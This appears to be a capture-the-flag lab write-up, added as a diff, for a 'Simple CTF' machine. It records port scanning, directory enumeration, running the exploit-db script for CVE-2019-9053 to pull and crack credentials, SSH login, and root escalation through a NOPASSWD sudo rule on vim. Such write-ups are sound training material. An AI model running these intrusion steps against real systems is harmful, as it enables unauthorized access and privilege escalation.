@@ -1,0 +1,72 @@
+SIMPLE CTF.
+
+
+SCANNING.
+Quick nmap scan:
+nmap -sT -p1-1000 -T4 -sV 10.10.155.44
+
+Scan all ports (to find highest):
+nmap -sT -p- -T4 -sV 10.10.155.44
+
+
+CVE.
+Note:
+Hint shows the vuln is CVE-2019-9053.
+
+
+ENUMERATION.
+Find gobuster directories:
+gobuster dir -u 10.10.154.44 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+OUTPUT:
+/simple
+
+
+EXPLOITATION.
+Script source:
+https://www.exploit-db.com/exploits/46635
+
+Issues:
+Script runs on python2, and termcolor module needs to be downloaded.
+Pip2 termcolor installation:
+curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
+sudo python2 get-pip.py
+pip2 install --upgrade setuptools pip wheel
+pip2 install termcolor
+
+Execution:
+python2 Downloads/46635.py -u http://10.10.155.44/simple --crack -w ~/thm/10k-most-common.txt
+OUTPUT:
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
+
+ssh login:
+ssh mitch@10.10.154.44
+
+flag:
+ls -l
+cat user.txt
+
+List all user directories:
+ls /home
+OUTPUT:
+mitch  sunbath
+
+Check sudo permissions:
+sudo -l
+OUTPUT:
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+
+
+SHELL.
+Gain root:
+sudo /usr/bin/vim
+:!sh
+
+Flag:
+cat /root/root.txt
+OUTPUT:
+W3ll d0n3. You made it!
